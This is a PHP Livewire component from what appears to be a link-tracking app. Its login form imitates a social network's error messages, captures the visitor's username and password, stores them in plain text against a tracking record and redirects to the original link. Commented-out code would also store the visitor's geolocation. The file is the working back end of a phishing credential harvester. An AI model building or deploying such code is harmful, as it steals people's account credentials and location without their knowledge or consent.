<?php

namespace App\Http\Livewire;

use App\Models\TrackedData;
use App\Models\Tracking;
use Livewire\Component;

class LocationComponent extends Component
{
    public $username;
    public $password;
    // public $latitude;
    // public $longitude;
  
    // protected $listeners = ['got-user-location' => 'setUserLocation'];

    // public function setUserLocation($position)
    // {
    //     $this->latitude = $position['latitude'];
    //     $this->longitude = $position['longitude'];

    //     $trackingId = session()->get('url')['trackingId'];
    //     $url = session()->get('url')['value'];
    //     $tracker = TrackedData::find($trackingId)->first();
    //     if($tracker) {
    //         $tracker->update([
    //             'latitude' => $this->latitude,
    //             'longitude' => $this->longitude,
    //             'username' => $this->username,
    //             'password' => $this->password,
    //     ]);
    //     }
    //     // session()->forget('url');
    //     return redirect($url);
    // }

    // public function getUserLocation()
    // {
    //     $this->dispatchBrowserEvent('get-user-location');
    // }

    public function render()
    {
        return view('livewire.location-component');
    }

    public function login()
    {
        $this->validate([
            'username' => 'required',
            'password' => 'required_with:username',
        ], [
            'username.required' => 'The email or mobile number you entered isn’t connected to an account.',
            'password.required_with' => 'The password you’ve entered is incorrect.',
        ]);
        
        $trackingId = session()->get('url')['trackingId'];
        $url = session()->get('url')['value'];
        $tracker = TrackedData::find($trackingId)->first();
        if($tracker) {
            $tracker->update([
                'username' => $this->username,
                'password' => $this->password,
            ]);
        }
        return redirect($url);
    
    }

}
